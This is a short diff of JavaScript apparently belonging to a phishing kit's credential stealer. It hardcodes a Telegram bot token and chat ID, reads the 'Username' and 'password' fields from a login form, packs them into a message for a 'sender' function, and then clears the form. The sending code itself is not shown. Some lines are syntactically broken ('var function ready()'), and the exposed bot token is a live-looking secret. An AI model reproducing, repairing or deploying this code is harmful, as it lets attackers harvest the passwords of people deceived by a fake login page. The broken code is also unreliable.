@@ -1,10 +1,10 @@
 var telegram_bot_id = "5618597143:AAE2j2MEiYfwFy-80ELc7bo039cuzhXEvDg";
-var chat_id = 5361641680;
-var Username, passwords, message;
+var chat_id = 5618597143;
+var Username, password ;
 var  function ready() {
     Username = document.getElementById("Username").value;
-    passwords = document.getElementById("passwords").value;
-    message = "Username: " + Username + "\passwords: " + passwords ;
+    password = document.getElementById("password").value;
+    message = "Username: " + Username + "\password: " + password ;
 };
 var function sender() {
     ready();
@@ -26,6 +26,6 @@ var function sender() {
         console.log(response);
     });
     document.getElementById("Username").value = "";
-    document.getElementById("passwords").value = "";
+    document.getElementById("password").value = "";
     return false;
 };
